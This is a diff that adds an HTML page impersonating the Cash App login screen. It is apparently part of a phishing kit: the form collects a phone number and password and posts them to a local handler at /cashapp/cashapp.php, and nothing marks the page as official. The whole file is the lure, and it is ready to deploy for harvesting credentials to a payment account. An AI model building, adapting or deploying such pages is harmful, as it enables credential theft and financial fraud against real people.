@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CashApp Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <h1>CashApp</h1>
+            <form action="/cashapp/cashapp.php" method="POST">
+                <div class="input-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your email phone number" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Enter Password</label>
+                    <input type="text" id="password" name="password" placeholder="Enter your Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="signup-link">
+                <p>New to CashApp? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
